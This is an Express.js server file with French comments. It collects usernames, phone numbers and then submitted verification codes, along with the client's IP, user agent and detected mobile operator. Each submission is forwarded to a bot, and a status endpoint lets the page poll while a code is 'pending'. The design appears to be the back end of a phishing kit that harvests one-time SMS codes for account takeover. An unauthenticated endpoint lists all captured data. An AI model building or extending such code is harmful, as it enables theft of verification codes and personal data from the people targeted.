require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { users } = require('./store');
const { sendInitialEmbed, sendCodeEmbed } = require('./bot');
const { detectOperator } = require('./operators');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress || 
         'IP inconnue';
}

app.post('/api/v1/submit', async (req, res) => {
  const { username, phone } = req.body;
  if (!username || !phone) return res.status(400).json({ error: 'Données manquantes' });
  
  const submissionId = `${username}_${Date.now()}`;
  if (users[username]) {
    console.log(`Nouvelle soumission pour l'utilisateur: ${username}, ID: ${submissionId}`);
  }
  
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'User-Agent inconnu';
  
  // Détection de l'opérateur avec la nouvelle fonction
  const operatorData = detectOperator(phone);
  
  users[username] = {
    phone,
    status: 'waiting_code',
    submittedCode: null,
    lastAttemptedCode: null,
    ip,
    userAgent,
    operator: operatorData.operator,
    operatorColor: operatorData.color
  };
  
  await sendInitialEmbed(username, phone);
  res.json({ success: true });
});

app.post('/api/v1/verify', async (req, res) => {
  const { username, code } = req.body;
  const user = users[username];
  
  if (!user) return res.status(404).json({ error: 'Introuvable' });
  
  user.lastAttemptedCode = code;
  user.submittedCode = code;
  user.status = 'pending';
  
  await sendCodeEmbed(username);
  res.json({ success: true });
});

app.get('/api/v1/status/:username', (req, res) => {
  const user = users[req.params.username];
  if (!user) return res.status(404).json({ error: 'Introuvable' });
  
  res.json({ status: user.status });
});

// Nouveau endpoint pour obtenir les statistiques des opérateurs
app.get('/api/v1/stats/operators', (req, res) => {
  const operatorStats = {};
  
  Object.values(users).forEach(user => {
    const operator = user.operator || 'Inconnu';
    operatorStats[operator] = (operatorStats[operator] || 0) + 1;
  });
  
  res.json(operatorStats);
});

// Endpoint pour obtenir tous les utilisateurs (avec pagination)
app.get('/api/v1/users', (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 10;
  const startIndex = (page - 1) * limit;
  const endIndex = page * limit;
  
  const allUsers = Object.entries(users).map(([username, data]) => ({
    username,
    ...data
  }));
  
  const paginatedUsers = allUsers.slice(startIndex, endIndex);
  
  res.json({
    users: paginatedUsers,
    pagination: {
      page,
      limit,
      total: allUsers.length,
      pages: Math.ceil(allUsers.length / limit)
    }
  });
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});
